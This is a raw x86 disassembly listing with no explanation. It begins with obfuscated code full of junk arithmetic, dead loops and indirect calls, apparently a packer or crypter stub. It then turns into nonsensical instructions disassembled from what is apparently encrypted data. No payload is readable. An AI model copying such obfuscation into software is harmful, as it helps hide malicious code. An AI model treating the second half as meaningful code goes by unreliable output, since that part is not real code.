  413ef9:	mov    ebx,DWORD PTR [ebp-0x58]
  413efc:	mov    DWORD PTR ds:0x42a00c,0x1eac
  413f06:	add    edx,0x5708f8
  413f0c:	and    DWORD PTR ds:0x42900c,0x77ed
  413f16:	imul   edx,ebx
  413f19:	mov    DWORD PTR [ebp-0x58],edx
  413f1c:	mov    edx,DWORD PTR [ebp+0x8]
  413f1f:	mov    ebx,DWORD PTR [ebp-0x54]
  413f22:	add    edx,0x64f8da
  413f28:	sub    DWORD PTR ds:0x42a010,0x32d9
  413f32:	or     edx,ebx
  413f34:	mov    DWORD PTR [ebp-0x54],edx
  413f37:	mov    ebx,DWORD PTR ds:0x424bf9
  413f3d:	mov    ebx,DWORD PTR [ebx]
  413f3f:	and    DWORD PTR ds:0x429000,ebx
  413f45:	mov    edx,DWORD PTR [ebp+0x8]
  413f48:	movzx  ebx,WORD PTR ds:0x42d018
  413f4f:	sub    DWORD PTR ds:0x42a008,ebx
  413f55:	mov    ebx,DWORD PTR [ebp-0x50]
  413f58:	and    DWORD PTR ds:0x42b010,0x42c010
  413f62:	add    edx,ecx
  413f64:	xor    edx,ebx
  413f66:	sbb    DWORD PTR ds:0x42c008,ecx
  413f6c:	mov    DWORD PTR [ebp-0x50],edx
  413f6f:	and    DWORD PTR ds:0x429028,edi
  413f75:	mov    edx,DWORD PTR [ebp+0x8]
  413f78:	mov    ebx,DWORD PTR [ebp-0x4c]
  413f7b:	add    DWORD PTR ds:0x42a010,0x42d01c
  413f85:	add    edx,edi
  413f87:	and    edx,ebx
  413f89:	mov    DWORD PTR [ebp-0x4c],edx
  413f8c:	mov    edx,DWORD PTR [ebp+0x8]
  413f8f:	and    DWORD PTR ds:0x42c000,0x0
  413f99:	jmp    0x413fab
  413f9e:	mov    ebx,DWORD PTR ds:0x42c000
  413fa4:	inc    ebx
  413fa5:	mov    DWORD PTR ds:0x42c000,ebx
  413fab:	cmp    DWORD PTR ds:0x42c000,0x10
  413fb2:	jae    0x413ffa
  413fb8:	cmp    DWORD PTR ds:0x42c000,0x9
  413fbf:	jne    0x413fd5
  413fc5:	push   0x42c008
  413fca:	push   0x5bd0
  413fcf:	call   DWORD PTR ds:0x42ed5f
  413fd5:	cmp    DWORD PTR ds:0x42c000,0x8
  413fdc:	jne    0x413fef
  413fe2:	mov    ebx,DWORD PTR ds:0x42c000
  413fe8:	inc    ebx
  413fe9:	mov    DWORD PTR ds:0x42c000,ebx
  413fef:	jmp    0x413f9e
  413ff4:	sub    DWORD PTR ds:0x42b004,ecx
  413ffa:	mov    ebx,DWORD PTR [ebp-0x48]
  413ffd:	lea    edx,[ebx+edx*1+0x241fc1f]
  414004:	sub    DWORD PTR ds:0x42b000,edx
  41400a:	mov    DWORD PTR [ebp-0x48],edx
  41400d:	sbb    DWORD PTR ds:0x429000,0x7854
  414017:	mov    edx,DWORD PTR [ebp+0x8]
  41401a:	inc    DWORD PTR ds:0x42d010
  414020:	mov    ebx,0xfa5e15e2
  414025:	add    DWORD PTR ds:0x42c008,0x42b018
  41402f:	sub    ebx,edx
  414031:	adc    DWORD PTR ds:0x42a000,ecx
  414037:	add    ebx,DWORD PTR [ebp-0x44]
  41403a:	sub    DWORD PTR ds:0x42c014,0x2136
  414044:	mov    DWORD PTR [ebp-0x44],ebx
  414047:	mov    edx,DWORD PTR [ebp+0x8]
  41404a:	or     DWORD PTR ds:0x429014,0x183b
  414054:	xor    edx,eax
  414056:	add    DWORD PTR ds:0x429020,0x42d004
  414060:	add    edx,esi
  414062:	mov    DWORD PTR ds:0x42d004,0x5303
  41406c:	jne    0x411ae9
  414072:	mov    DWORD PTR ds:0x42c008,0x42b5
  41407c:	jmp    0x41f655
  414081:	and    DWORD PTR ds:0x42a000,0x0
  41408b:	jmp    0x41409f
  414090:	xor    ebx,ebx
  414092:	add    ebx,DWORD PTR ds:0x42a000
  414098:	inc    ebx
  414099:	mov    DWORD PTR ds:0x42a000,ebx
  41409f:	cmp    DWORD PTR ds:0x42a000,0x14
  4140a6:	jae    0x414104
  4140ac:	cmp    DWORD PTR ds:0x42a000,0x5
  4140b3:	jne    0x4140d7
  4140b9:	push   0x42e134
  4140be:	push   0x41d9
  4140c3:	push   0x49c5
  4140c8:	push   DWORD PTR [ebp-0x14]
  4140cb:	push   DWORD PTR [ebp-0x1c]
  4140ce:	push   DWORD PTR [ebp-0xc]
  4140d1:	call   DWORD PTR ds:0x42ed67
  4140d7:	cmp    DWORD PTR ds:0x42a000,0x4
  4140de:	jne    0x4140f1
  4140e4:	mov    ebx,DWORD PTR ds:0x42a000
  4140ea:	inc    ebx
  4140eb:	mov    DWORD PTR ds:0x42a000,ebx
  4140f1:	jmp    0x414090
  4140f6:	mov    edx,DWORD PTR ds:0x424b05
  4140fc:	mov    edx,DWORD PTR [edx]
  4140fe:	add    DWORD PTR ds:0x42a01c,edx
  414104:	mov    edx,DWORD PTR [ebp-0x14]
  414107:	and    DWORD PTR ds:0x42d008,0x0
  414111:	jmp    0x414123
  414116:	mov    ebx,DWORD PTR ds:0x42d008
  41411c:	inc    ebx
  41411d:	mov    DWORD PTR ds:0x42d008,ebx
  414123:	cmp    DWORD PTR ds:0x42d008,0x17
  41412a:	jae    0x414148
  414130:	cmp    DWORD PTR ds:0x42d008,0x27
  414137:	jne    0x414143
  41413d:	call   DWORD PTR ds:0x42ed6b
  414143:	jmp    0x414116
  414148:	mov    ebx,DWORD PTR [ebp-0x8]
  41414b:	sub    DWORD PTR ds:0x42d010,0x429028
  414155:	xor    edx,eax
  414157:	xor    ebx,eax
  414159:	sub    edx,ebx
  41415b:	sub    edx,esi
  41415d:	xor    edx,eax
  41415f:	mov    DWORD PTR [ebp-0x14],edx
  414162:	mov    edx,DWORD PTR [ebp-0x10]
  414165:	mov    DWORD PTR ds:0x42b000,0x55d1
  41416f:	jmp    0x4164f8
  414174:	pop    ecx
  414175:	loope  0x414113
  414177:	mov    dl,0x84
  414179:	jnp    0x414176
  41417b:	ror    eax,1
  41417d:	scas   eax,DWORD PTR es:[edi]
  41417e:	pop    ebx
  41417f:	cmc    
  414180:	sub    DWORD PTR [ebx+0x29],eax
  414183:	mov    dl,0xa5
  414185:	jae    0x414201
  414187:	jp     0x41418f
  414189:	pop    edi
  41418a:	jp     0x414206
  41418c:	pop    ds
  41418d:	js     0x414112
  41418f:	jmp    0x4141ef
  414191:	xor    ebp,DWORD PTR [esi+0x2fb9c1c6]
  414197:	aad    0xfc
  414199:	mov    cl,0xbc
  41419b:	stos   DWORD PTR es:[edi],eax
  41419c:	pop    esi
  41419d:	test   eax,0xde57a5da
  4141a2:	or     BYTE PTR ds:0xdf10977,0x4d
  4141a9:	cld    
  4141aa:	push   esp
  4141ab:	mov    BYTE PTR [ecx],ch
  4141ad:	adc    al,0x90
  4141af:	pop    es
  4141b0:	fiadd  WORD PTR [eax+ebx*2+0x7d924635]
  4141b7:	popa   
  4141b8:	mov    al,0x64
  4141ba:	das    
  4141bb:	es push ecx
  4141bd:	jno    0x4141fa
  4141bf:	push   esi
  4141c0:	inc    BYTE PTR [ebx+0x73ac6045]
  4141c6:	mov    eax,ds:0xe19d8eb4
  4141cb:	fs push esi
  4141cd:	cs cs dec edi
  4141d0:	xchg   edx,eax
  4141d1:	jge    0x414223
  4141d3:	push   edx
  4141d4:	rol    dl,cl
  4141d6:	ins    BYTE PTR es:[edi],dx
  4141d7:	inc    ecx
  4141d8:	mov    al,0x4
  4141da:	shl    ebp,1
  4141dc:	and    bl,BYTE PTR [ebp-0xb]
  4141df:	js     0x414179
  4141e1:	mov    eax,0x2b9fadb2
  4141e6:	(bad)  ds:0x2e0c601c
  4141ec:	push   0xe91f5169
  4141f1:	fstp   DWORD PTR [esi+0x418f9ef8]
  4141f7:	jne    0x4141dc
  4141f9:	shl    DWORD PTR [edi],0x92
  4141fc:	push   cs
  4141fd:	leave  
  4141fe:	adc    bl,BYTE PTR [edi-0x3c]
  414201:	sub    DWORD PTR [ebp-0x24e52a6d],ebx
  414207:	sub    eax,0x824cfc4b
  41420c:	inc    esi
  41420d:	mov    ebx,0x8b54f850
  414212:	mov    al,0xe
  414214:	rol    BYTE PTR [eax+0x37],0x5
  414218:	aas    
  414219:	ins    DWORD PTR es:[edi],dx
  41421a:	mov    al,ds:0xd933642d
  41421f:	or     ebp,DWORD PTR [ebx]
  414221:	in     al,0x81
  414223:	cmc    
  414224:	bound  esp,QWORD PTR [edi+0x151cc97c]
  41422a:	data16 cmp BYTE PTR [edi-0x7a],dl
  41422e:	inc    ebp
  41422f:	je     0x4141eb
  414231:	call   0x4faa:0x76c3eb5b
  414238:	push   0xa7bc23d8
  41423d:	inc    esp
  41423e:	clc    
  41423f:	xchg   esi,eax
  414240:	repz and esi,DWORD PTR [ebp+0x5]
  414244:	or     edi,ebp
  414246:	lods   al,BYTE PTR ds:[esi]
  414247:	ss pop ecx
  414249:	icebp  
  41424a:	xor    eax,DWORD PTR [edx]
  41424c:	imul   ecx,DWORD PTR [eax+0x45],0x49
  414250:	push   eax
  414251:	gs push ds
  414253:	pop    ebp
  414254:	or     ebp,eax
  414256:	jmp    0x787abf38
  41425b:	stc    
  41425c:	mov    bl,0xf
  41425e:	mov    eax,ds:0x796ea6ac
  414263:	stos   BYTE PTR es:[edi],al
  414264:	mov    eax,0xd3908c
  414269:	js     0x41428d
  41426b:	mov    esp,0x4e2cd398
  414270:	mov    bl,0xf6
  414272:	mov    ecx,0x3a569533
  414277:	fisub  WORD PTR [esi+eax*4-0x3c93c7dc]
  41427e:	xchg   edx,eax
  41427f:	icebp  
  414280:	mov    ch,0x85
  414282:	(bad)  
  414283:	lock mov ebp,0x7b5a93c0
  414289:	fdiv   QWORD PTR [edi-0x341aa125]
  41428f:	in     al,0xed
  414291:	pop    ss
  414292:	push   es
  414293:	mov    BYTE PTR [eax-0x7042d3fd],dh
  414299:	mov    edx,0xf44ea3bc
  41429e:	adc    ebx,ebx
  4142a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142a1:	push   cs
  4142a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142a3:	iret   
  4142a4:	test   DWORD PTR [eax+0x3f9c243],ecx
  4142aa:	rol    BYTE PTR [eax+0x6],1
  4142ad:	pushf  
  4142ae:	xor    al,0xfd
  4142b0:	dec    edi
  4142b1:	(bad)  
  4142b2:	and    BYTE PTR [edx+0x46],ah
  4142b5:	xchg   esi,eax
  4142b6:	or     eax,0x85526f2e
  4142bb:	sbb    eax,0xe8e4d6d9
  4142c0:	jae    0x41431a
  4142c2:	stos   DWORD PTR es:[edi],eax
  4142c3:	sbb    ah,BYTE PTR [eax]
  4142c5:	mov    ebp,0xd795c311
  4142ca:	push   ebx
  4142cb:	xor    al,0x6e
  4142cd:	sub    eax,0x500b3b8c
  4142d2:	push   eax
  4142d3:	ja     0x4142ad
  4142d5:	cld    
  4142d6:	xchg   BYTE PTR [edx-0x37c20b73],bl
  4142dc:	fsubr  QWORD PTR [eax]
  4142de:	sbb    ebx,DWORD PTR [ecx-0x2a5b5522]
  4142e4:	push   edx
  4142e5:	inc    esi
  4142e6:	adc    DWORD PTR [ebx],ecx
  4142e8:	sub    al,0xa8
  4142ea:	loope  0x414325
  4142ec:	adc    ebp,ebp
  4142ee:	mov    al,ds:0x10002810
  4142f3:	adc    bh,BYTE PTR [edi]
  4142f5:	sti    
  4142f6:	add    DWORD PTR [edx+ebx*4+0x2f],ebx
  4142fa:	jle    0x4142e6
  4142fc:	or     ah,cl
  4142fe:	or     al,ch
  414300:	leave  
  414301:	int    0xa
  414303:	adc    eax,0x142a8f1e
  414308:	add    eax,0x2592d4fb
  41430d:	jbe    0x414344
  41430f:	sbb    ebp,edi
  414311:	push   esp
  414312:	inc    ebx
  414313:	push   es
  414314:	shr    BYTE PTR [edi+0x204ac46f],0x97
  41431b:	pop    ebx
  41431c:	inc    edi
  41431d:	xlat   BYTE PTR ds:[ebx]
  41431e:	xchg   DWORD PTR [eax+esi*2-0x2b252159],edx
  414325:	sub    al,0xb
  414327:	cwde   
  414328:	add    dh,BYTE PTR [ebx-0xd]
  41432b:	imul   BYTE PTR [ebx+0x48]
  41432e:	ror    BYTE PTR [edi],1
  414330:	leave  
  414331:	call   esi
  414333:	xor    al,0x5f
  414335:	push   esi
  414336:	inc    edx
  414337:	nop
  414338:	add    cl,ah
  41433a:	mov    eax,ds:0xf7016e89
  41433f:	loop   0x41430f
  414341:	fs mov edx,0xe4c5c18d
  414347:	dec    esp
  414348:	repnz mov ds:0x1128ceab,al
  41434e:	inc    ebp
  41434f:	sub    edx,edx
  414351:	leave  
  414352:	add    ecx,DWORD PTR [edi-0x7d313664]
  414358:	ret    0xb023
  41435b:	addr16 xchg ebp,eax
  41435d:	and    DWORD PTR [eax],ebp
  41435f:	xchg   BYTE PTR [esi+esi*1+0x6f766912],bl
  414366:	fstp   TBYTE PTR [ecx-0x5dc65f23]
  41436c:	iret   
  41436d:	adc    BYTE PTR [edi+0x32f0577f],ah
  414373:	rol    DWORD PTR [esi],1
  414375:	ja     0x4143c3
  414377:	repz cdq 
  414379:	imul   eax,DWORD PTR [edi-0x6bd797ab],0xffffff92
  414380:	je     0x414322
  414382:	mov    bl,0xa5
  414384:	mov    ebp,0xda96886e
  414389:	cmp    edi,edx
  41438b:	dec    edi
  41438d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41438e:	leave  
  41438f:	loope  0x414314
  414391:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414392:	js     0x4143c5
  414394:	cmp    dl,BYTE PTR ds:0xfe051043
  41439a:	sbb    al,0xba
  41439c:	and    DWORD PTR [ecx+0x4912aa9d],edx
  4143a2:	mov    BYTE PTR [ebp-0x4b],dh
  4143a5:	jmp    0xb586c1cb
  4143aa:	and    BYTE PTR [eax-0xb],cl
  4143ad:	sbb    al,0x7a
  4143af:	cmp    edx,DWORD PTR [esi-0x266d1a7f]
  4143b5:	sbb    dl,BYTE PTR [esi]
  4143b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143b8:	ins    BYTE PTR es:[edi],dx
  4143b9:	jl     0x414428
  4143bb:	ja     0x41439c
  4143bd:	mov    WORD PTR [ebp-0x4a277889],fs
  4143c3:	jnp    0x4143e4
  4143c5:	jbe    0x41434b
  4143c7:	aam    0xe9
  4143c9:	mov    cl,0xb3
  4143cb:	xor    al,0x33
  4143cd:	or     BYTE PTR [ebp+0x3c],ah
  4143d0:	(bad)  
  4143d1:	mov    DWORD PTR [ebx-0x24],esi
  4143d4:	inc    edi
  4143d5:	cs adc ch,ch
  4143d8:	ins    DWORD PTR es:[edi],dx
  4143d9:	jecxz  0x414382
  4143db:	ret    0x4838
  4143de:	mov    DWORD PTR [edi-0x40],esp
  4143e1:	push   edx
  4143e2:	and    ah,0xde
  4143e5:	pop    esp
  4143e6:	es mov ch,0x61
  4143e9:	jle    0x414444
  4143eb:	and    BYTE PTR [ecx-0x4f],ah
  4143ee:	pop    ds
  4143ef:	push   ss
  4143f0:	arpl   WORD PTR [eax+0x369af8ce],cx
  4143f6:	jns    0x4143fb
  4143f8:	in     eax,dx
  4143f9:	hlt    
  4143fa:	sbb    cl,BYTE PTR [ebp+ecx*4+0x33731520]
  414401:	mov    WORD PTR [esi],ds
  414403:	ret    
  414404:	pop    esp
  414405:	das    
  414406:	cmp    al,al
  414408:	(bad)  
  414409:	psrld  mm7,QWORD PTR ds:0x3412706e
  414410:	jbe    0x4143ea
  414412:	sub    bh,BYTE PTR [ecx+0x7596b8c4]
  414418:	lds    eax,FWORD PTR [eax]
  41441a:	enter  0x901b,0xa4
  41441e:	retf   
  41441f:	xchg   esi,eax
  414420:	lock push eax
  414422:	aad    0x21
  414424:	inc    ebp
  414425:	pop    esp
  414426:	mov    ah,0xda
  414428:	or     DWORD PTR [esi+0x5],ecx
  41442b:	scas   al,BYTE PTR es:[edi]
  41442c:	inc    esp
  41442d:	fnstsw WORD PTR [esi-0x2e67b0b0]
  414433:	sub    eax,0x819f4fd8
  414438:	daa    
  414439:	xlat   BYTE PTR ds:[ebx]
  41443a:	pusha  
  41443b:	cmp    esi,esi
  41443d:	cmp    edx,DWORD PTR [ebp+0x50b1fb02]
  414443:	and    eax,0x3ec3540a
  414448:	jl     0x4144c2
  41444a:	aam    0x6b
  41444c:	outs   dx,DWORD PTR ds:[esi]
  41444d:	jns    0x41445e
  41444f:	dec    esi
  414450:	and    eax,0x8b069f37
  414455:	pop    ds
  414456:	mov    edx,0xa99af8aa
  41445b:	add    ebx,ecx
  41445d:	loope  0x414435
  41445f:	xchg   ecx,eax
  414460:	dec    ebx
  414462:	mov    ebx,0x91c30398
  414467:	retf   0x68c0
  41446a:	mov    dl,BYTE PTR [edi+0x48]
  41446d:	mov    ebx,DWORD PTR [esi-0x46]
  414470:	jno    0x4144b3
  414472:	fcom   st(6)
  414474:	mov    ch,0xf5
  414476:	sbb    al,0x4
  414478:	xor    cl,BYTE PTR [eax-0x74]
  41447b:	inc    ecx
  41447c:	xchg   BYTE PTR [edx+edx*2+0x5587fda8],ch
  414483:	inc    ecx
  414484:	adc    ebp,DWORD PTR [ebx+0x42]
  414487:	sbb    al,0xe2
  414489:	push   eax
  41448a:	push   0x75
  41448c:	addr16 nop
  41448e:	adc    edx,0xfffffff1
  414491:	jbe    0x414494
  414493:	and    dh,bl
  414495:	and    al,0xe2
  414497:	neg    ebp
  414499:	clc    
  41449a:	mov    ds:0x69b4ce13,eax
  41449f:	push   DWORD PTR [ebp+0x38b2d246]
  4144a5:	cmp    eax,0xee4ddc45
  4144aa:	adc    edi,esi
  4144ac:	or     al,0x56
  4144ae:	adc    al,0x60
  4144b0:	or     DWORD PTR [edi+0x282f0460],0x55d73a0d
  4144ba:	and    esi,DWORD PTR [ebp+0x9]
  4144bd:	fisttp WORD PTR [edx-0x62]
  4144c0:	shl    DWORD PTR [esi+eax*1+0xb7c0fcc],0xee
  4144c8:	rol    DWORD PTR [edx-0x41],1
  4144cb:	push   ss
  4144cc:	inc    esi
  4144cd:	sar    ecx,1
  4144cf:	mov    dh,0xe7
  4144d1:	rcr    ebp,1
  4144d3:	int3   
  4144d4:	and    al,0xe2
  4144d6:	fld    TBYTE PTR [edi+0x76]
  4144d9:	sub    al,0xfd
  4144db:	fbld   TBYTE PTR [ebx+ebp*2]
  4144de:	nop
  4144df:	dec    edx
  4144e0:	out    dx,eax
  4144e1:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4144e3:	pop    es
  4144e4:	mov    dh,0xce
  4144e6:	jno    0x41446e
  4144e8:	jle    0x41447f
  4144ea:	test   BYTE PTR [eax-0x54],0xff
  4144ee:	popf   
  4144ef:	jmp    0x4144b4
  4144f1:	or     edi,DWORD PTR [edi-0x5]
  4144f4:	jb     0x4144f5
  4144f6:	inc    edx
  4144f7:	nop
  4144f8:	stos   BYTE PTR es:[edi],al
  4144f9:	cmp    BYTE PTR [eax+0x79ab9033],dh
  4144ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414500:	inc    ecx
  414501:	daa    
  414502:	lods   eax,DWORD PTR ds:[esi]
  414503:	test   DWORD PTR [ebx-0x5311d7b0],edi
  414509:	xchg   ecx,esp
  41450b:	push   ds
  41450c:	sub    edx,DWORD PTR [ecx-0x46]
  41450f:	inc    esp
  414510:	fcmove st,st(6)
  414512:	stos   BYTE PTR es:[edi],al
  414513:	cwde   
  414514:	add    edx,0x42
  414517:	sti    
  414518:	ja     0x414582
  41451a:	push   eax
  41451b:	ficomp DWORD PTR [eax]
  41451d:	jg     0x41452e
  41451f:	xchg   BYTE PTR [eax],bh
  414521:	call   0x870d6fcf
  414526:	adc    bh,BYTE PTR [ebx]
  414528:	or     BYTE PTR [eax+0x51bf4bc],cl
  41452e:	add    al,BYTE PTR [esi+0x57]
  414531:	dec    edi
  414532:	jns    0x414595
  414534:	xchg   DWORD PTR [edx-0x33],edi
  414537:	add    BYTE PTR [edx-0x20],bh
  41453a:	inc    esp
  41453b:	mov    bh,0xea
  41453d:	mov    cl,0x9e
  41453f:	ret    0x5905
  414542:	or     eax,esi
  414544:	popa   
  414545:	sbb    eax,0x20d3e458
  41454a:	sbb    eax,0x5d6b8118
  41454f:	dec    esp
  414550:	mov    ch,0x6a
  414552:	lahf   
  414553:	cmp    al,0x7d
  414555:	or     eax,0x33b1acb9
  41455a:	rcl    esp,1
  41455c:	inc    ecx
  41455d:	sbb    eax,0xd14f13bd
  414562:	clc    
  414563:	aaa    
  414564:	xchg   esi,eax
  414565:	sahf   
  414566:	mov    cl,bl
  414568:	fs jge 0x41455e
  41456b:	pop    ebp
  41456c:	mov    dh,0x50
  41456e:	push   ss
  41456f:	xchg   esp,eax
  414570:	out    dx,eax
  414571:	and    al,0xf
  414573:	mov    ch,0xb8
  414575:	pop    edx
  414576:	(bad)  
  414577:	aaa    
  414578:	inc    edi
  414579:	(bad)  
  41457a:	call   0xa5b2:0x971b412c
  414581:	jl     0x41456b
  414583:	fldenv [ebx]
  414585:	pop    edi
  414586:	(bad)  [edi-0x31c011da]
  41458c:	sub    al,0x1
  41458e:	dec    ecx
  41458f:	fnsave [ecx+0x3]
  414592:	(bad)  
  414593:	xchg   ebx,eax
  414594:	scas   eax,DWORD PTR es:[edi]
  414595:	mov    ebx,?
  414597:	cdq    
  414598:	ins    DWORD PTR es:[edi],dx
  414599:	into   
  41459a:	or     DWORD PTR [ebx-0x49587294],ebp
  4145a0:	mov    ecx,0xe5c83d45
  4145a5:	dec    eax
  4145a6:	fxch   st(0)
  4145a8:	leave  
  4145a9:	mov    eax,ds:0xd7670c47
  4145ae:	loop   0x4145dd
  4145b0:	adc    BYTE PTR [edx-0x3f0cc3b],0x4e
  4145b7:	xor    DWORD PTR [edx+edx*4],0x755cfd0b
  4145be:	ja     0x41460d
  4145c0:	or     eax,0xbd82e35c
  4145c5:	out    0xe7,eax
  4145c7:	outs   dx,BYTE PTR ds:[esi]
  4145c8:	test   BYTE PTR [ecx],dl
  4145ca:	xchg   esi,eax
  4145cb:	outs   dx,DWORD PTR ds:[esi]
  4145cc:	jle    0x414552
  4145ce:	pop    es
  4145cf:	jnp    0x4145db
  4145d1:	(bad)  
  4145d2:	cwde   
  4145d3:	pop    ebp
  4145d4:	jp     0x4145ab
  4145d6:	add    ch,BYTE PTR [ebx-0x1cb6fc40]
  4145dc:	imul   BYTE PTR [edi-0x7a024d52]
  4145e2:	push   ds
  4145e3:	mov    dl,0x31
  4145e5:	add    al,0xca
  4145e7:	stc    
  4145e8:	or     esi,DWORD PTR [ecx-0x12]
  4145eb:	shl    ebp,0x9
  4145ee:	jmp    0x924c9146
  4145f3:	jo     0x41457e
  4145f5:	xchg   DWORD PTR [ebp-0x62cccc83],ecx
  4145fb:	sbb    eax,0x38fcdb5
  414600:	lds    esi,FWORD PTR [ecx]
  414602:	in     eax,0x33
  414604:	nop
  414605:	jno    0x414656
  414607:	xor    BYTE PTR [esi+0x607dffc1],0x98
  41460e:	fwait
  41460f:	pop    ebp
  414610:	into   
  414611:	rcl    BYTE PTR [ecx-0x1c],0xac
  414615:	mov    ch,0x78
  414617:	mov    bh,0xbf
  414619:	mov    BYTE PTR [ecx],cl
  41461b:	addr16 xchg bh,bl
  41461e:	jae    0x414647
  414620:	jnp    0x4145a2
  414622:	clc    
  414623:	shl    edi,1
  414625:	mov    cl,0x75
  414627:	mov    ecx,0xb312f63b
  41462c:	aas    
  41462d:	test   al,0x4e
  41462f:	mov    ds:0x374c2129,al
  414634:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414635:	adc    bh,dl
  414637:	mov    al,BYTE PTR [edx+0x6461b501]
  41463d:	fsub   DWORD PTR [edi-0x58]
  414640:	dec    al
  414642:	fldpi  
  414644:	pop    edi
  414645:	aam    0xdd
  414647:	or     ch,ch
  414649:	loop   0x414685
  41464b:	fild   WORD PTR [ebx+0x1c]
  41464e:	ud1    esi,eax
  414651:	shl    eax,0x9f
  414654:	mov    eax,ds:0xf46f2d29
  414659:	xlat   BYTE PTR ds:[ebx]
  41465a:	mov    esp,0x8ccb022f
  41465f:	sar    DWORD PTR [eax-0x1fb8eaf8],cl
  414665:	(bad)  
  414666:	and    DWORD PTR [ecx-0x17],ebx
  414669:	mov    bl,0xf8
  41466b:	jae    0x4145fe
  41466d:	test   ebx,ebx
  41466f:	cmp    DWORD PTR [edx+ebx*8+0x20],esi
  414673:	jmp    0x414618
  414675:	sti    
  414676:	out    dx,eax
  414677:	sub    al,0x30
  414679:	test   DWORD PTR [ebx+0x2cdad037],0xbd9a7829
  414683:	out    dx,eax
  414684:	loope  0x414664
  414686:	out    0x5a,al
  414688:	mov    bh,0xc
  41468a:	add    BYTE PTR [ebx+edx*8-0x4e0240ed],ch
  414691:	xor    DWORD PTR [eax+0x69],0x95a7954d
  414698:	iret   
  414699:	(bad)  
  41469a:	mov    edi,0xd111f3c2
  41469f:	mov    ah,0x25
  4146a1:	add    eax,0x59bfad52
  4146a6:	lods   eax,DWORD PTR ss:[esi]
  4146a8:	and    al,0x43
  4146aa:	cmp    BYTE PTR [edx-0x4dc20c3c],dh
  4146b0:	adc    eax,0x9a89322d
  4146b5:	shr    ebx,1
  4146b7:	loope  0x4146de
  4146b9:	jnp    0x414670
  4146bb:	(bad)  [esi+0x18]
  4146be:	mov    dl,BYTE PTR ds:[edi+0x2694cf67]
  4146c5:	adc    eax,0xe88f09b2
  4146ca:	in     eax,dx
  4146cb:	fild   DWORD PTR [ebx]
  4146cd:	test   DWORD PTR [edx+0x3f20f174],0x1596ebde
  4146d7:	push   0xffffffe4
  4146d9:	cmp    BYTE PTR [edx+0xa355e52],dl
  4146df:	test   DWORD PTR [ecx+edi*2+0x5071ec5f],ebp
  4146e6:	push   ebx
  4146e7:	test   eax,0x68042f92
  4146ec:	push   cs
  4146ed:	jns    0x41467c
  4146ef:	aaa    
  4146f0:	mov    ebx,0x6eeedbad
  4146f5:	mov    eax,0x45e80c19
  4146fa:	pushf  
  4146fb:	mov    DWORD PTR [esi],ebp
  4146fd:	push   ecx
  4146fe:	sti    
  4146ff:	push   ecx
  414700:	sub    esi,DWORD PTR [eax-0xa]
  414703:	jecxz  0x41473b
  414705:	shl    BYTE PTR [ebp+0x44],cl
  414708:	pop    ss
  414709:	mov    al,ds:0x52a69656
  41470e:	leave  
  41470f:	xor    al,0x30
  414711:	sbb    cl,dh
  414713:	mov    esp,0x86c0cfdf
  414718:	popf   
  414719:	mov    DWORD PTR [edx+0x292d472b],ebp
  41471f:	push   ebp
  414720:	mov    ch,0xd4
  414722:	or     BYTE PTR [esi+0x16],cl
  414725:	or     BYTE PTR [ebx+0x613eb5f0],0x32
  41472c:	mov    es,WORD PTR [ebp+0x79aef124]
  414732:	mov    bh,0x89
  414734:	scas   al,BYTE PTR es:[edi]
  414735:	nop
  414736:	(bad)  
  414737:	repz mov cl,bh
  41473a:	adc    ch,BYTE PTR [ecx+0x12cde164]
  414740:	adc    eax,0xe01a7b9e
  414745:	pop    eax
  414746:	adc    al,0xf2
  414748:	lock clc 
  41474a:	jle    0x4147bc
  41474c:	jecxz  0x41479c
  41474e:	in     eax,dx
  41474f:	or     BYTE PTR [ecx],0x6
  414752:	ins    BYTE PTR es:[edi],dx
  414753:	arpl   WORD PTR [edx-0x7b70e1e2],ax
  414759:	lahf   
  41475a:	mov    ds:0x49d211ac,al
  41475f:	xor    BYTE PTR [ebx+0x6e],ch
  414762:	repnz mov ebp,0x5478b9ab
  414768:	and    eax,0xd89aa284
  41476d:	scas   al,BYTE PTR es:[edi]
  41476e:	sub    eax,0x32660259
  414773:	int    0x22
  414775:	jg     0x4147b4
  414777:	xchg   esi,eax
  414778:	cs inc ebp
  41477a:	xchg   edi,eax
  41477b:	test   al,0xf8
  41477d:	jmp    0x4147fb
  41477f:	mov    esp,0x41f09ea6
  414784:	fs pop eax
  414786:	jmp    FWORD PTR [edi+edx*4]
  414789:	and    BYTE PTR [ecx-0x5c],0x55
  41478d:	xchg   esp,eax
  41478e:	add    cl,BYTE PTR [edx+0x26458f]
  414794:	stos   DWORD PTR es:[edi],eax
  414795:	rcr    DWORD PTR [eax+0x4d],1
  414798:	or     ebx,DWORD PTR [eax+ebp*1-0x13]
  41479c:	out    dx,al
  41479d:	(bad)  
  41479e:	(bad)  
  41479f:	jmp    0x4147de
  4147a1:	sbb    ebx,DWORD PTR [esi]
  4147a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147a4:	and    al,0x25
  4147a6:	pop    ss
  4147a7:	sar    BYTE PTR [ecx],0xf2
  4147aa:	push   ebx
  4147ab:	mov    dh,0xee
  4147ad:	jmp    0x4147e7
  4147af:	cwde   
  4147b0:	(bad)  
  4147b1:	push   ebp
  4147b2:	or     dh,BYTE PTR [esi+0x4b]
  4147b5:	bound  esi,QWORD PTR [ebx]
  4147b7:	ss or  ebp,ecx
  4147ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147bb:	adc    ecx,ecx
  4147bd:	push   cs
  4147be:	or     DWORD PTR [esi-0x6d],ecx
  4147c1:	mov    DWORD PTR [ebx],ebx
  4147c3:	mov    edi,0x34d0f9b6
  4147c8:	outs   dx,BYTE PTR ds:[esi]
  4147c9:	jne    0x41474c
  4147cb:	pop    edi
  4147cc:	dec    ecx
  4147cd:	cdq    
  4147ce:	fld    DWORD PTR [esi+0x1a13762d]
  4147d4:	pushf  
  4147d5:	and    bl,al
  4147d7:	stos   BYTE PTR es:[edi],al
  4147d8:	jmp    0x94c2f335
  4147dd:	xchg   ebx,eax
  4147de:	cld    
  4147df:	push   ss
  4147e0:	mov    al,0x6
